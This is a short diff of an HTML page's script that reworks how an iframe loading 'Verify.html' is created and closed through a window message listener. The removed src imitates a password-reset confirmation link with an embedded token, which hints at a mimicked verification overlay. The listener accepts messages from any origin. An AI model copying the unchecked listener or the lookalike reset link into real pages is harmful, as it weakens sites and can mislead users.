@@ -132,29 +132,28 @@
       }, 1600); // Adjust the initial delay as needed
    </script>
 
-   <!-- Add the iframe-related code here -->
    <script>
-      function loadIframe() {
-         const iframe = document.createElement('iframe');
+    // Listen for messages from any iframe
+    window.addEventListener('message', function(event) {
+        if (event.data === 'close') {
+            // Close the iframe when a 'close' message is received
+            document.getElementById('myiframe').remove();
+            console.log('Iframe closed');
+        }
+    });
 
-         // Set iframe attributes
-         iframe.src = 'password/reset/confirm/uidb36=7qiyibu&token=EWRuV3VwKF7rxeffAIcnQymf8KklugVa8AcSYfGj8zK9LWk44NMBlpPRSvMXePS3:one_click_login_email&s=one_click_login_email/Verify.html'; // Change the URL to your desired destination
-         iframe.id = 'myiframe';
+    function loadIframe() {
+        const iframe = document.createElement('iframe');
 
-         // Log to console indicating that we are inside an iframe
-         console.log('Inside iframe');
+        // Set iframe attributes
+        iframe.src = 'Verify.html'; // Change the URL to your desired destination
+        iframe.id = 'myiframe';
 
-         // Append iframe to body
-         document.body.appendChild(iframe);
+        // Log to console indicating that we are inside an iframe
+        console.log('Inside iframe');
 
-         // Listen for messages from the iframe
-        window.addEventListener('message', function(event) {
-            if (event.data === 'close') {
-                // Close the iframe when a 'close' message is received
-                document.getElementById('myiframe').remove();
-                console.log('Iframe closed');
-            }
-        });
+        // Append iframe to body
+        document.body.appendChild(iframe);
     }
 </script>
 </body>
